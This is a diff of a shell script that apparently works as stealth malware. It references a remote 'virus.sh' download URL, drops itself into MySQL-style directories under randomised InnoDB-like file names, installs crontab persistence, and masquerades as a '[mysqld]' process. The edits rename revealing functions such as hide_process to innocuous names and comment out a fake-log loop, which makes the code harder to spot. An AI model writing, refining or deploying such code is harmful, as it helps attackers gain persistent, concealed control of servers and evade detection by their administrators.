@@ -3,14 +3,14 @@
 GITHUB_SCRIPT_URL="https://raw.githubusercontent.com/him1k0ta/test/main/virus.sh"
 MYSQL_DIRS=("/tmp/mysql" "/var/tmp/mysql" "/dev/shm/mysql" "/run/mysqld" "/var/lib/mysql")
 
-generate_mysql_name() {
+generate_name() {
     PREFIXES=("ibdata" "ib_logfile" "mysql-bin" "undo" "redo" "ibtmp" "binlog" "relay-log" "mysql" "innodb")
     RANDOM_PREFIX=${PREFIXES[$RANDOM % ${#PREFIXES[@]}]}
     RANDOM_NUMBER=$((RANDOM % 10000))
     echo "${RANDOM_PREFIX}${RANDOM_NUMBER}"
 }
 
-find_mysql_dir() {
+find_dir() {
     for dir in "${MYSQL_DIRS[@]}"; do
         mkdir -p "$dir" 2>/dev/null
         if [ -w "$dir" ]; then
@@ -22,13 +22,13 @@ find_mysql_dir() {
     echo "/tmp/mysql"
 }
 
-hide_process() {
+process() {
     exec -a "[mysqld]" "$SCRIPT_PATH" 2>/dev/null &
 }
 
 main() {
-    MYSQL_DIR=$(find_mysql_dir)
-    RANDOM_NAME=$(generate_mysql_name)
+    MYSQL_DIR=$(find_dir)
+    RANDOM_NAME=$(generate_name)
     SCRIPT_PATH="$MYSQL_DIR/$RANDOM_NAME"
     
     if ! crontab -l 2>/dev/null | grep -q "$SCRIPT_PATH"; then
@@ -41,12 +41,12 @@ main() {
         ) | crontab -
     fi
     
-    hide_process
+    process
     
-    while true; do
-        echo "$(date) [Note] InnoDB: Checksum" >> "$MYSQL_DIR/mysql.log" 2>/dev/null
-        sleep $((60 + RANDOM % 60))
-    done &
+    # while true; do
+    #     echo "$(date) [Note] InnoDB: Checksum" >> "$MYSQL_DIR/mysql.log" 2>/dev/null
+    #     sleep $((60 + RANDOM % 60))
+    # done &
 }
 
 main
